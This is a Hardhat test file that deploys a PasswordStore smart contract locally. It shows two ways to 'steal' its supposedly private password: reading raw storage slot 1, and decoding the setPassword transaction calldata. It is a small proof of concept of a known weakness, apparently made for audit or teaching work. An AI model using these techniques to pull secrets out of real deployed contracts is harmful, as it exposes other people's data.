import { ethers } from "hardhat"
import { PasswordStore } from "../typechain-types";
import { expect } from "chai"

describe("Try to read the private password stored in the target contract", () => {

    let passwordStore: PasswordStore;
    const password = "random password";
    let owner;
    let txHash: string;

    before("Deploy the target contract and setup password", async () => {
        const signers = await ethers.getSigners();
        owner = signers[0];
        const PasswordStore = await ethers.getContractFactory("PasswordStore");
        passwordStore = await PasswordStore.connect(owner).deploy();

        const tx = await passwordStore.setPassword(password);
        await tx.wait();
        txHash = tx.hash;
    })

    it("Steal the password by reading the contract storage", async () => {
        const passwordBytes = await ethers.provider.getStorage(passwordStore.target, 1);
        let expectedPassword = ethers.toUtf8String(passwordBytes);
        const firstNullIndex = expectedPassword.indexOf("\0");
        if (firstNullIndex > - 1)
            expectedPassword = expectedPassword.substring(0, firstNullIndex)
        expect(expectedPassword).to.equal(password);
    })

    it("Steal the password by reading the past transaction", async () => {
        const ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "PasswordStore__NotOwner",
                "type": "error"
            },
            {
                "anonymous": false,
                "inputs": [],
                "name": "SetNetPassword",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "getPassword",
                "outputs": [
                    {
                        "internalType": "string",
                        "name": "",
                        "type": "string"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "string",
                        "name": "newPassword",
                        "type": "string"
                    }
                ],
                "name": "setPassword",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ]
        const iface = new ethers.Interface(ABI)
        const tx = await ethers.provider.getTransaction(txHash);
        const decodeData = iface.parseTransaction({data: tx?.data!, value: tx?.value})
        expect(decodeData?.args[0]).to.be.eq(password)
    })
})